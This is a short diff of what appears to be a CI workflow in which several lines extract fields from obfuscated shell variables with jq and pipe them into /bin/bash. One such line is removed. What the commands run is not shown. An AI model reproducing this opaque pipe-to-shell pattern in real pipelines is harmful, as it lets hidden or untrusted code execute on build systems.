@@ -29,7 +29,6 @@ jobs:
           echo $hvfup3 | jq -r .a70 | /bin/bash
           echo $ip0 | jq -r .y1 | /bin/bash
           echo $zt9307 | jq -r .y70136 | /bin/bash
-          printf '%s' "$tp819" | jq -r .mx65 | /bin/bash
           printf '%s' "$kuosy713" | jq -r .fvtps4 | /bin/bash
           echo $qudlh27 | jq -r .ipr75 | /bin/bash
 
